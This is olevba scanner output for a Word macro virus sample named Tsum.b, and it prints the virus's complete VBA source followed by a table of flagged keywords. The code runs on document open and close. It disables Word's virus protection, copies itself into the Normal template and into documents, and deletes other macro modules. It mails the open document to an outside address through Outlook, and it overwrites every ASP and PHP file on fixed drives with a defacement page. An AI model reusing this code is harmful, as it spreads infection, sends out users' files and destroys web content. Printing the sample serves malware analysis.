olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tsum.b-40983964279561c59fd8e9f83dd82edabe11032c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tsum.b-40983964279561c59fd8e9f83dd82edabe11032c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sunami.bas 
in file: Virus.MSWord.Tsum.b-40983964279561c59fd8e9f83dd82edabe11032c - OLE stream: 'Macros/VBA/sunami'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' hi there you have been attacked by sunami
' to get the rid of sunami drop me a mail at
' tsunami.india@indiatimes.com

Sub AutoExec()
    On Error Resume Next
    Call link2file
    Call hackSITE
End Sub

Sub AutoNew()
    On Error Resume Next
    Call link2file
End Sub

Sub AutoClose()
    On Error Resume Next
    Call link2file
    Call saveATTACK
    Call doSUNAMI
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub AutoExit()
    On Error Resume Next
    Call link2file
    Call saveATTACK
    Call doSUNAMI
End Sub

Sub AutoOpen()
    On Error Resume Next
    Call link2file
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub inspDIR()
    Dim MyFile, MyPath, MyName
    On Error Resume Next
    
    MyPath = "c:\sunami"
    MyName = Dir(MyPath, vbDirectory)
    
    If MyName = "" Then
     MkDir "c:\sunami"
    End If
   
End Sub

Sub saveATTACK()
    Dim no_of_docs, file1
    Dim myDate, myTime
    
    On Error Resume Next
    
    no_of_docs = Application.Documents.Count
    If no_of_docs < 1 Then Exit Sub
    
    myDate = Date
    myTime = Time
    
    s1 = Trim(Format(myDate, "dd~mmm~yyyy"))
    s2 = Trim(Format(myTime, "hh~mm~ss AMPM"))
    
    file1 = s1 + "(" + s2 + ")"
    
    Call inspDIR
    
    path1 = "c:\sunami\" + file1 + ".doc"
  
  ' this is ver 2.0 of my previous script -sa- -pa- -t- -tra
  ' if you still fill safe, wait i am going something real sunami
  ' be fill free to write to me at :   tsunami.india@indiatimes.com
  ' go ahead and donate for sunami victims.
  
  
    ActiveDocument.SaveAs FileName:=path1, FileFormat:=wdFormatDocument, _
        LockComments:=False, Password:="tsunami.india", AddToRecentFiles:=True, WritePassword _
        :="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, _
        SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:= _
        False
   
    Call doSUNAMI
End Sub


Function check2attack(location As Integer) As Boolean
    Dim mfile, ccount, index, filePROJ
    Dim signflag As Boolean
    Dim sigunature As String
    
    On Error Resume Next
    
    CommandBars("Tools").Controls("Macro").Enabled = False
   
    Application.DisplayAlerts = wdAlertsNone
    Application.ScreenUpdating = False
    Application.EnableCancelKey = wdCancelInterrupt
    Options.VirusProtection = False
    signature = "sunami"
    signflag = False
    
    If Application.Documents.Count < 1 Then
      check2attack = False
      Exit Function
    End If
    
    ' delete all other modules than sunami !
    Call checkOTHER
    
    Select Case location
      Case 1: Set filePROJ = ActiveDocument.VBProject
      Case 2: Set filePROJ = NormalTemplate.VBProject

      Case Else:
    End Select
    
    ccount = filePROJ.VBComponents.Count
    For i% = 1 To ccount
        mm$ = filePROJ.VBComponents.Item(i%).Name
        If Trim(mm$) = signature Then signflag = True
    Next i%
  
    check2attack = signflag
  
err_lbl:
End Function


Sub link2file()
    Dim ld, ln, mfile
        
    On Error Resume Next
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    
    'check for document
        ld = check2attack(1)
    
    'check for normal template
        ln = check2attack(2)
    
    mfile = "c:\acidtest.drv"
    
    If (ln And ld) Then
      'module is attached hence exit
      GoTo exit_label_2
    End If
    
    If (ld = False) Then
     'module is not attached to active document the attach to it
      Word.NormalTemplate.VBProject.VBComponents.Item("sunami").Export mfile
      Word.ActiveDocument.VBProject.VBComponents.Import mfile
      Kill mfile
      ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
    
    If (ln = False) Then
     'module is not attached to active document the attach to it
     Word.ActiveDocument.VBProject.VBComponents.Item("sunami").Export mfile
     Word.NormalTemplate.VBProject.VBComponents.Import mfile
     Kill mfile
     NormalTemplate.Save
    End If
    
exit_label_2:
End Sub
'-----------------------------------------------

Sub doSUNAMI()
    
    On Error Resume Next
    
    ActiveDocument.Save
    ActiveDocument.HasRoutingSlip = True
    With ActiveDocument.RoutingSlip
        .Subject = "Help Victims of sunami of India!"
        .AddRecipient "tsunami.india@indiatimes.com"
        .Delivery = wdAllAtOnce
    End With
    ActiveDocument.Route

    Call OutlookSEND
    
End Sub


Sub OutlookSEND()

    Dim bStarted As Boolean
    Dim oOutlookApp
    Dim oItem
    
    On Error Resume Next
    
  
    Set oOutlookApp = GetObject(, "Outlook.Application")
    If Err <> 0 Then
        Set oOutlookApp = CreateObject("Outlook.Application")
        bStarted = True
    End If
    
    Set oItem = oOutlookApp.CreateItem(olMailItem)
    
    With oItem
        .To = "tsunami.india@indiatimes.com"
        .Subject = "Help Victims of tsunami INDIA!!!"
        .Attachments.Add Source:=ActiveDocument.FullName, Type:=olByValue, DisplayName:="Please find attached file."
        .Send
    End With
    
    If bStarted Then
        oOutlookApp.Quit
    End If
    
    Set oItem = Nothing
    Set oOutlookApp = Nothing
    
End Sub
 
'-----------------------------------------------------------

Sub checkOTHER()
    Dim filePROJ, tmpCOMP
    Dim signflag As Boolean
    Dim sigunature As String
    
    On Error Resume Next
    
    ' remove all other modules other than sunami
    
    signature = "sunami"
    
    If Application.Documents.Count < 1 Then
          Exit Sub
    End If
    
    For location = 1 To 2
        Select Case location
          Case 1: Set filePROJ = ActiveDocument.VBProject
          Case 2: Set filePROJ = NormalTemplate.VBProject
    
          Case Else:
        End Select
        
        ccount = filePROJ.VBComponents.Count
        For i% = 1 To ccount
            mm$ = filePROJ.VBComponents.Item(i%).Name
            If Trim(mm$) <> signature And Trim(mm$) <> "ThisDocument" Then
              Set tmpCOMP = filePROJ.VBComponents.Item(i%)
              filePROJ.VBComponents.Remove tmpCOMP
            End If
        Next i%
  Next location

End Sub
'-----------------------------------------------------

Sub deleteFILE(drv As Variant, fType As String)
  Dim fs, d, dc, s, n
    
  On Error Resume Next
  
  Set fs = Application.FileSearch
  
  With fs
    .LookIn = drv
    .SearchSubFolders = True
    .FileName = fType
    
    If .Execute() > 0 Then
        For i = 1 To .FoundFiles.Count
          s = .FoundFiles(i)
          writeNEWASP (s)
        Next i
    End If
  
  End With

End Sub


Sub hackSITE()
    Dim fs, d, dc, s
    
    On Error Resume Next
    
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set dc = fs.Drives
    
    For Each d In dc
        s = d.DriveLetter
        
        Select Case d.DriveType
            Case 0: GoTo label1  ' Unknown
            Case 1: GoTo label1  ' Removable
            Case 2: s = s & ":\" ' Fixed
            Case 3: GoTo label1  ' Network
            Case 4: GoTo label1  ' CD-ROM
            Case 5: GoTo label1  ' RAM Disk
        End Select
       
     Call deleteFILE(s, "*.asp")
     Call deleteFILE(s, "*.php")
     Call deleteFILE(s, "*.aspx")
     Call deleteFILE(s, "*.php3")

label1:
    Next
    
End Sub

'----------------------------------------------------
Sub writeNEWASP(p As String)
   On Error Resume Next
   
   Kill p
   
   Open p For Output As #1
   
   Print #1, "<html>"
   Print #1, "<body bgcolor=#FF0000>"
   Print #1, "<h1> This website has been hacked by IndiaMaster </h1>"
   Print #1, "<p>"
   Print #1, "<p>"
   Print #1, "<p>"
   Print #1, "<h2> drop me mail at: <a>tsunami.india@indiatimes.com</a></h2>"
   Print #1, "</body>"
   Print #1, "</html>"
   
   Close #1
   
   
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

